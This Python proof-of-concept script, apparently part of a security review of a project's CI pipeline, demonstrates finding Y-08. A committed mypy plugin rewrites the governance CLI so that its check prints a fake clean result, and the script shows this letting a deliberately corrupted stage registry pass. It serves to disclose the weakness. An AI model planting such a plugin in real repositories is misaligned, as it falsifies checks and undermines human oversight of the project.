"""Y-08: CI's governance check can still be replaced without touching a Stage 00 owned path.
`pyproject.toml` (not owned) may name a mypy plugin by file path. The CI "Static analysis" step
runs mypy before the "Governance state" step, so a committed non-owned plugin file can rewrite
the checked-out src/citerift/governance/cli.py on disk; the later
`python -P -m citerift.governance.cli check` then runs the rewritten module. The src/ guard and
-P do not help, because the file is rewritten in place inside src/citerift.

The script replays the CI steps in a clone of the reviewed revision (no network)."""
import subprocess

from lib import BASE, clone_base, run

repo = clone_base("Y08")
PLUGIN = '''
from pathlib import Path
from mypy.plugin import Plugin

cli = Path(__file__).parent / "src/citerift/governance/cli.py"
text = cli.read_text()
if "REWRITTEN" not in text:
    cli.write_text(text.replace("def cmd_check(orc: Orchestrator, args: argparse.Namespace) -> int:\\n",
        "def cmd_check(orc: Orchestrator, args: argparse.Namespace) -> int:\\n"
        "    print('Consistency check: 0 errors, 0 warnings')  # REWRITTEN\\n    return 0\\n", 1))


def plugin(version: str) -> type[Plugin]:
    return Plugin
'''
(repo / "ci_mypy_plugin.py").write_text(PLUGIN)
py = (repo / "pyproject.toml").read_text()
(repo / "pyproject.toml").write_text(py.replace('files = ["src"]\n', 'files = ["src"]\nplugins = ["ci_mypy_plugin.py"]\n'))
# Break the registry by hand so that an honest check fails.
reg = (repo / "governance/stage_registry.json").read_text()
(repo / "governance/stage_registry.json").write_text(reg.replace('"status": "IN_PROGRESS"', '"status": "ACCEPTED_CLOSED"', 1))
env = {"PYTHONPATH": "src", "GIT_AUTHOR_NAME": "r", "GIT_AUTHOR_EMAIL": "r@x.invalid",
       "GIT_COMMITTER_NAME": "r", "GIT_COMMITTER_EMAIL": "r@x.invalid"}
subprocess.run(["git", "-C", str(repo), "add", "-A"], check=True)
subprocess.run(["git", "-C", str(repo), "commit", "-qm", "pyproject mypy plugin + hand edit"], check=True, env={**env})
venv_py = str(BASE / ".venv" / "bin" / "python")
mypy = str(BASE / ".venv" / "bin" / "mypy")
print("honest check before the CI steps:",
      run([venv_py, "-P", "-m", "citerift.governance.cli", "check"], repo, env).stdout.splitlines()[0])
print("step 'Nothing beside the citerift package in src':",
      subprocess.run(["sh", "-c", 'test "$(ls -A src)" = "citerift"'], cwd=repo).returncode)
m = run([mypy], repo, env)
print("step mypy exit:", m.returncode, m.stdout.strip().splitlines()[-1] if m.stdout.strip() else m.stderr[-200:])
c = run([venv_py, "-P", "-m", "citerift.governance.cli", "check"], repo, env)
print("step 'Governance state' (python -P -m citerift.governance.cli check):", c.returncode, c.stdout.strip())
print("owned file changed on disk:", subprocess.run(["git", "-C", str(repo), "status", "--porcelain"],
                                                    capture_output=True, text=True).stdout.strip())
